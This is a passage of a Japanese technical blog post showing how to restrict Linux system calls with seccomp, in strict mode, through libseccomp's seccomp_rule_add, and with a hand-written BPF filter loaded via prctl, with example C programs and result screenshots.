string\">&lt;linux/seccomp.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/prctl.h></span></span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">prctl</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>PR_SET_SECCOMP<span class=\"token operator\">=</span><span class=\"token number\">0x16</span><span class=\"token punctuation\">,</span>SECCOMP_MODE_STRICT<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></span>\n    <span class=\"token function\">prctl</span><span class=\"token punctuation\">(</span>PR_SET_SECCOMP<span class=\"token punctuation\">,</span> SECCOMP_MODE_STRICT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>args <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token string\">\"/bin/echo\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"After enable seccomp.\"</span> <span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">execve</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/echo\"</span><span class=\"token punctuation\">,</span>args<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>参考：<a href=\"https://docs.huihoo.com/doxygen/linux/kernel/3.7/include_2uapi_2linux_2seccomp_8h.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Linux Kernel: include/uapi/linux/seccomp.h File Reference</a></p>\n<p>参考：<a href=\"https://github.com/spotify/linux/blob/master/include/linux/prctl.h\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">linux/include/linux/prctl.h at master · spotify/linux</a></p>\n<p>このコードをコンパイルして実行すると、以下のように execve システムコールを実行しようとした際に SIGKILL によってプロセスが終了させられることを確認できます。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/0ee175e14f41725ecf75677f3f330566/a3767/image-20240618230141319.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 70%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAACDUlEQVQ4y31T55raQBADQi82rhQbgwu4Y+Dy/q+mjIZLvlwu8GO+Wa+9Wo0k96LKgZ9NsXJnMJwAphdg7R+kQhhugJWzhet5MEwDg8EAvV7vfZV1gTAKYDuWlAPP9+FIP56OyItc+gmHQwjLtrBaLbFcLjGZTF6DN22NPM9xik/IzqmAXGR9RBDu0V4bdLcr0izFZruBv/EV3HUdLJaL14BJmuhH4SFAEOwRHSPsdlv4vid7oQKRNcdeLBbvRyaLowCkAhonJ2V4uZy1Z8IsTmI0TY2yKpTpfDGHbdsij43RaPQd8HbvdMQoOughHr4/biDzsizw8fOh4NSzu3WIRRrqu9vvYBgG5vM5hsMfXwHTLNFDBKybCoUAEbAQELLmYdVPLqUk67WJyXSi5vT7/T+lgGRz7VplRdCizJUZzXiOmWjnPr+rqlLfb0XjPBd5tM7COsJ0OkWv6646MsUPw0A7R6J27HthlMiaRtFpPnNsmsYIWdZaDLOF7fjJkAacL5nexthUdaWRMWUsy7K+j/RZr3MoJlC3x8cdZEs2v/U0JSb/Hvgb+L+XtW3zdFc62TE+WxmNrjuSzfF4rOPMZjPNIHUaDofvc0g3n6C1/h0U/xn4WOWg6NSUa7rOy6LP7FJzTsWMci2ArUaBrgViii3/rIotnQFm1qin67lqgGma+ldRX5Yn+3yn38j+L/oeYNGWNgJgAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/0ee175e14f41725ecf75677f3f330566/8ac56/image-20240618230141319.webp 240w,\n/static/0ee175e14f41725ecf75677f3f330566/d3be9/image-20240618230141319.webp 480w,\n/static/0ee175e14f41725ecf75677f3f330566/e46b2/image-20240618230141319.webp 960w,\n/static/0ee175e14f41725ecf75677f3f330566/efe91/image-20240618230141319.webp 1210w\"\n              sizes=\"(max-width: 960px) 100vw, 960px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/0ee175e14f41725ecf75677f3f330566/8ff5a/image-20240618230141319.png 240w,\n/static/0ee175e14f41725ecf75677f3f330566/e85cb/image-20240618230141319.png 480w,\n/static/0ee175e14f41725ecf75677f3f330566/d9199/image-20240618230141319.png 960w,\n/static/0ee175e14f41725ecf75677f3f330566/a3767/image-20240618230141319.png 1210w\"\n            sizes=\"(max-width: 960px) 100vw, 960px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/0ee175e14f41725ecf75677f3f330566/d9199/image-20240618230141319.png\"\n            alt=\"image-20240618230141319\"\n            title=\"image-20240618230141319\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<h3 id=\"libseccomp-を使用して-seccomp-bpf-を実装する\" style=\"position:relative;\"><a href=\"#libseccomp-%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%97%E3%81%A6-seccomp-bpf-%E3%82%92%E5%AE%9F%E8%A3%85%E3%81%99%E3%82%8B\" aria-label=\"libseccomp を使用して seccomp bpf を実装する permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>libseccomp を使用して seccomp-bpf を実装する</h3>\n<p>次は、libseccomp の seccomp<em>rule</em>add を使用して seccomp-bpf を実装してみます。</p>\n<p>コードは <a href=\"https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/seccomp\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">HackTricks</a> の以下のサンプルをそのまま使用します。</p>\n<p><code class=\"language-text\">seccomp_rule_add</code> は、libseccomp というライブラリに含まれる関数で、より簡単に seccomp フィルタを実装するために使用できます。</p>\n<p>参考：<a href=\"https://github.com/seccomp/libseccomp\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">seccomp/libseccomp: The main libseccomp repository</a></p>\n<p>参考：<a href=\"https://manpages.ubuntu.com/manpages/focal/en/man3/seccomp_rule_add.3.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Ubuntu Manpage: seccomp<em>rule</em>add, seccomp<em>rule</em>add_exact - Add a seccomp filter rule</a></p>\n<p>このライブラリ関数を使用する場合、コンパイル時には <code class=\"language-text\">gcc main.c -lseccomp</code> のように <code class=\"language-text\">-lseccomp</code> を付与する必要があります。</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;seccomp.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;errno.h></span></span>\n\n<span class=\"token comment\">//https://security.stackexchange.com/questions/168452/how-is-sandboxing-implemented/175373</span>\n<span class=\"token comment\">//gcc seccomp_bpf.c -o seccomp_bpf -lseccomp</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">/* initialize the libseccomp context */</span>\n  scmp_filter_ctx ctx <span class=\"token operator\">=</span> <span class=\"token function\">seccomp_init</span><span class=\"token punctuation\">(</span>SCMP_ACT_KILL<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  \n  <span class=\"token comment\">/* allow exiting */</span>\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Adding rule : Allow exit_group\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>ctx<span class=\"token punctuation\">,</span> SCMP_ACT_ALLOW<span class=\"token punctuation\">,</span> <span class=\"token function\">SCMP_SYS</span><span class=\"token punctuation\">(</span>exit_group<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  \n  <span class=\"token comment\">/* allow getting the current pid */</span>\n  <span class=\"token comment\">//printf(\"Adding rule : Allow getpid\\n\");</span>\n  <span class=\"token comment\">//seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(getpid), 0);</span>\n  \n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Adding rule : Deny getpid\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>ctx<span class=\"token punctuation\">,</span> <span class=\"token function\">SCMP_ACT_ERRNO</span><span class=\"token punctuation\">(</span>EBADF<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">SCMP_SYS</span><span class=\"token punctuation\">(</span>getpid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">/* allow changing data segment size, as required by glibc */</span>\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Adding rule : Allow brk\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>ctx<span class=\"token punctuation\">,</span> SCMP_ACT_ALLOW<span class=\"token punctuation\">,</span> <span class=\"token function\">SCMP_SYS</span><span class=\"token punctuation\">(</span>brk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  \n  <span class=\"token comment\">/* allow writing up to 512 bytes to fd 1 */</span>\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Adding rule : Allow write upto 512 bytes to FD 1\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>ctx<span class=\"token punctuation\">,</span> SCMP_ACT_ALLOW<span class=\"token punctuation\">,</span> <span class=\"token function\">SCMP_SYS</span><span class=\"token punctuation\">(</span>write<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function\">SCMP_A0</span><span class=\"token punctuation\">(</span>SCMP_CMP_EQ<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function\">SCMP_A2</span><span class=\"token punctuation\">(</span>SCMP_CMP_LE<span class=\"token punctuation\">,</span> <span class=\"token number\">512</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  \n  <span class=\"token comment\">/* if writing to any other fd, return -EBADF */</span>\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Adding rule : Deny write to any FD except 1 \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>ctx<span class=\"token punctuation\">,</span> <span class=\"token function\">SCMP_ACT_ERRNO</span><span class=\"token punctuation\">(</span>EBADF<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">SCMP_SYS</span><span class=\"token punctuation\">(</span>write<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function\">SCMP_A0</span><span class=\"token punctuation\">(</span>SCMP_CMP_NE<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  \n  <span class=\"token comment\">/* load and enforce the filters */</span>\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Load rules and enforce \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">seccomp_load</span><span class=\"token punctuation\">(</span>ctx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">seccomp_release</span><span class=\"token punctuation\">(</span>ctx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">//Get the getpid is denied, a weird number will be returned like</span>\n  <span class=\"token comment\">//this process is -9</span>\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"this process is %d\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">getpid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>参考：<a href=\"https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/seccomp\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Seccomp | HackTricks | HackTricks</a></p>\n<p>このコードをコンパイルして実行すると、seccomp-bpf によって getpid の実行に失敗することを確認できます。(seccomp-bpf によりシステムコールの発行がブロックされる場合は、Strict モードとは異なり SIGKILL によってプロセスが停止されるわけではなさそうです)</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 638px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/1beffd969817fba58a2bb216a52f3527/41be6/image-20240619200854256.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 25.416666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA20lEQVQY041Qy5KCMBAMFodlIYAQTHjlgSAIBt3i/7+tN+DVg4eurpqafsyQdigg78whAzcUrKLglcKl1mjMCHkdwUqJ6MwRpgw0Ew784ICekeQCYRgiTVPESQyybRvsY8VtGCFEibZpYdcF1i7o+w6/wQ9OJw+EkO9wnycMtx5StWAsBysYumsHrRW4cE1iijx/z3dkeXa0SZLks+Hr74mHazNNI+qmdmYG69NiXmaIUqCqKxcmXXsO5UKUdudHEXzf/2yojTpExuiDd2FxKRAEwddn7rue937LP0bveFKiLRihAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/1beffd969817fba58a2bb216a52f3527/8ac56/image-20240619200854256.webp 240w,\n/static/1beffd969817fba58a2bb216a52f3527/d3be9/image-20240619200854256.webp 480w,\n/static/1beffd969817fba58a2bb216a52f3527/a2d8a/image-20240619200854256.webp 638w\"\n              sizes=\"(max-width: 638px) 100vw, 638px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/1beffd969817fba58a2bb216a52f3527/8ff5a/image-20240619200854256.png 240w,\n/static/1beffd969817fba58a2bb216a52f3527/e85cb/image-20240619200854256.png 480w,\n/static/1beffd969817fba58a2bb216a52f3527/41be6/image-20240619200854256.png 638w\"\n            sizes=\"(max-width: 638px) 100vw, 638px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/1beffd969817fba58a2bb216a52f3527/41be6/image-20240619200854256.png\"\n            alt=\"image-20240619200854256\"\n            title=\"image-20240619200854256\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/7a9575f93f717e74e475d17c01671a5d/d6a46/image-20240619200923008.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 38.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABJElEQVQoz31R2W6DMBDkSBBgYhuwwSlpgUht//8LpzsbRU3VNg8jY3aZiyyEEcQ0TWjbFn3fYxwHTPOEfujl7pHSDO8dulOHUXZvOyPyPEeWZT8xy4ckmOcZrWkxyPP5nGCtRYwRy2VB13U4CVlKSc7Tb5JHxCnCi4sQAuqmhnMWTtxYOb33qOtaBemUDnknuekMjDEq1jSNnmVZIGPUQaLRjaHDYVBy55zieDyqY8amCMHYFOWcQqygqqqbQ3bFAZe8Dr0uU513irBbRuW7e7SiKBR5kYuz8jvyx+c71u0N277het2RxA1/BrtkHXRP0RgDgoBJrH3S47av2hGX2NG9H7omweX1gmV5URFNIrvs9l9Cutq2VWOy8Mfh4XB4/kf/wBfrV7ZCm9jKSgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/7a9575f93f717e74e475d17c01671a5d/8ac56/image-20240619200923008.webp 240w,\n/static/7a9575f93f717e74e475d17c01671a5d/d3be9/image-20240619200923008.webp 480w,\n/static/7a9575f93f717e74e475d17c01671a5d/e46b2/image-20240619200923008.webp 960w,\n/static/7a9575f93f717e74e475d17c01671a5d/6e1e4/image-20240619200923008.webp 1008w\"\n              sizes=\"(max-width: 960px) 100vw, 960px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/7a9575f93f717e74e475d17c01671a5d/8ff5a/image-20240619200923008.png 240w,\n/static/7a9575f93f717e74e475d17c01671a5d/e85cb/image-20240619200923008.png 480w,\n/static/7a9575f93f717e74e475d17c01671a5d/d9199/image-20240619200923008.png 960w,\n/static/7a9575f93f717e74e475d17c01671a5d/d6a46/image-20240619200923008.png 1008w\"\n            sizes=\"(max-width: 960px) 100vw, 960px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/7a9575f93f717e74e475d17c01671a5d/d9199/image-20240619200923008.png\"\n            alt=\"image-20240619200923008\"\n            title=\"image-20240619200923008\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<h3 id=\"prctl-で-seccomp-bpf-を実装する\" style=\"position:relative;\"><a href=\"#prctl-%E3%81%A7-seccomp-bpf-%E3%82%92%E5%AE%9F%E8%A3%85%E3%81%99%E3%82%8B\" aria-label=\"prctl で seccomp bpf を実装する permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>prctl で seccomp-bpf を実装する</h3>\n<p>libseccomp は、複雑になりやすい seccomp-bpf  フィルタを簡単に実装するために利用できるライブラリですが、このライブラリを使用せずとも、prctl を使用して seccomp-bpf を実装することも可能です。</p>\n<p>prctl で seccomp-bpf を構成する場合、以下のようなコードを使用します。</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token function\">prctl</span><span class=\"token punctuation\">(</span>PR_SET_SECCOMP、SECCOMP_MODE_FILTER、prog<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>seccomp-bpf を構成するため、prctl の第 2 引数には <code class=\"language-text\">SECCOMP_MODE_STRICT</code> ではなく <code class=\"language-text\">SECCOMP_MODE_FILTER</code> を指定しています。</p>\n<p>また、Strict モードを使用する場合と異なり、第 3 引数 prog にフィルタプログラムを格納する <code class=\"language-text\">struct sock_fprog</code> へのポインタを与えます。</p>\n<p>参考：<a href=\"https://www.kernel.org/doc/html/v4.19/userspace-api/seccomp_filter.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Seccomp BPF (フィルターを使用したセキュアコンピューティング) — Linux カーネルのドキュメント</a></p>\n<p>ここで、前項と同じように getpid を禁止するフィルタを追加する以下のコードを作成しました。</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;errno.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stddef.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;linux/audit.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;linux/filter.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;linux/seccomp.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;linux/unistd.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/prctl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/syscall.h></span></span>\n\n<span class=\"token keyword\">struct</span> <span class=\"token class-name\">sock_filter</span> filter<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_LD <span class=\"token operator\">|</span> BPF_W <span class=\"token operator\">|</span> BPF_ABS<span class=\"token punctuation\">,</span> <span class=\"token function\">offsetof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">seccomp_data</span><span class=\"token punctuation\">,</span> arch<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function\">BPF_JUMP</span><span class=\"token punctuation\">(</span>BPF_JMP <span class=\"token operator\">|</span> BPF_JEQ <span class=\"token operator\">|</span> BPF_K<span class=\"token punctuation\">,</span> AUDIT_ARCH_X86_64<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_RET <span class=\"token operator\">|</span> BPF_K<span class=\"token punctuation\">,</span> SECCOMP_RET_KILL<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_LD <span class=\"token operator\">|</span> BPF_W <span class=\"token operator\">|</span> BPF_ABS<span class=\"token punctuation\">,</span> <span class=\"token function\">offsetof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">seccomp_data</span><span class=\"token punctuation\">,</span> nr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function\">BPF_JUMP</span><span class=\"token punctuation\">(</span>BPF_JMP <span class=\"token operator\">|</span> BPF_JEQ <span class=\"token operator\">|</span> BPF_K<span class=\"token punctuation\">,</span> __NR_getpid<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_RET <span class=\"token operator\">|</span> BPF_K<span class=\"token punctuation\">,</span> SECCOMP_RET_ERRNO <span class=\"token operator\">|</span> EPERM<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_RET <span class=\"token operator\">|</span> BPF_K<span class=\"token punctuation\">,</span> SECCOMP_RET_ALLOW<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">struct</span> <span class=\"token class-name\">sock_fprog</span> prog <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">.</span>len <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>filter<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>filter<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">.</span>filter <span class=\"token operator\">=</span> filter<span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">prctl</span><span class=\"token punctuation\">(</span>PR_SET_NO_NEW_PRIVS<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"prctl(PR_SET_NO_NEW_PRIVS)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span>EXIT_FAILURE<span class=\"token punctuation\">)</span><span 